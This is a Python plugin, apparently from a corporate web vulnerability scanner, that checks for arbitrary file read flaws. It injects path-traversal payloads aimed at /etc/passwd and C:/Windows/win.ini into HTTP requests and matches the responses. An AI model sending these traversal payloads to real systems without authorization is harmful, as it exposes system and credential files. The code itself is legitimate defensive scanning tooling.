#!/ usr/bin/env
# coding=utf-8
#
# Copyright 2019 ztosec & https://www.zto.com/
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""
author: b5mali4
"""
import re
import ssl
import urllib3

urllib3.disable_warnings()
import json
import requests
from common import http_util
from plugins.base.vuln_enum import VulnType
from plugins.base.base_checker import BaseChecker


class Checker(BaseChecker):
    def init_plugin_info(self):
        """
        插件信息
        :return: 
        """
        tag = "owasp"
        name = "file_read"
        imp_version = "所有版本"
        description = "该接口存在任意文件读取风险，详情请参考http://wiki.dev.ztosys.com/pages/viewpage.action?pageId=35914886"
        repair = "严格过滤参数值"
        type = VulnType.FILE_READ
        author = "b5mali4"
        temp_info = {"repair": repair, "name": name, "type": type, "description": description,
                     "imp_version": imp_version, "author": author, "tag": tag}
        self.info = dict(self.info, **temp_info)

    def check_logic(self, request_raw):
        """
        任意文件读取检测逻辑
        :param request_raw: 
        :return: 
        """
        http_method = str(request_raw["method"]).lower()
        temp_url = str(request_raw["url"]).strip()
        temp_headers = http_util.header_to_lowercase(json.loads(request_raw['headers']))
        content_type = temp_headers[
            "content-type"] if temp_headers is not None and http_util.ContentType.NAME.lower() in temp_headers else None
        temp_data = request_raw['data'] if "data" in request_raw else None

        self.check_linux(request_raw, http_method, temp_url, temp_headers, content_type, temp_data)
        if self.result["status"]:
            return

        self.check_windows(request_raw, http_method, temp_url, temp_headers, content_type, temp_data)
        if self.result["status"]:
            return

    def check_linux(self, request_raw, http_method, temp_url, temp_headers, content_type, temp_data):
        """
        检测LINUX 系统
        :param request_raw: 
        :param http_method: 
        :param temp_url: 
        :param temp_headers: 
        :param content_type: 
        :param temp_data: 
        :return: 
        """
        for system_file in ["/../../../../../etc/passwd", "../../../../../etc/passwd"]:
            req = None
            try:
                payload = self.get_parser_class(request_raw).add_poc_data(url=temp_url, data=temp_data,
                                                                          http_method=http_method,
                                                                          content_type=content_type, poc=system_file)
                req = requests.request(method=payload["http_method"], url=payload["url"], data=payload["data"],
                                       headers=temp_headers, timeout=5, verify=False)
            except Exception:
                pass
            if req:
                res_content = req.content.decode("utf-8")
                if "root:" in res_content and "daemon:" in res_content:
                    self.result['status'] = True
                    self.result['info'] = '%s 存在一个任意文件读取漏洞' % request_raw['url']
                    self.result['payload'] = payload
                    return

    def check_windows(self, request_raw, http_method, temp_url, temp_headers, content_type, temp_data):
        """
        检测WINDOWS 系统
        :param request_raw: 
        :param http_method: 
        :param temp_url: 
        :param temp_headers: 
        :param content_type: 
        :param temp_data: 
        :return: 
        """
        for system_file in ["/../../../../../C:/Windows/win.ini", "../../../../../C:/Windows/win.ini"]:
            req = None
            try:
                payload = self.get_parser_class(request_raw).add_poc_data(url=temp_url, data=temp_data,
                                                                          http_method=http_method,
                                                                          content_type=content_type, poc=system_file)
                req = requests.request(method=payload["http_method"], url=payload["url"], data=payload["data"],
                                       headers=temp_headers, timeout=5, verify=False)
            except Exception:
                pass
            if req:
                res_content = req.content.decode("utf-8")
                if "MAPI" in res_content and "[fonts]" in res_content:
                    self.result['status'] = True
                    self.result['info'] = '%s 存在一个任意文件读取漏洞' % request_raw['url']
                    self.result['payload'] = payload
                    return
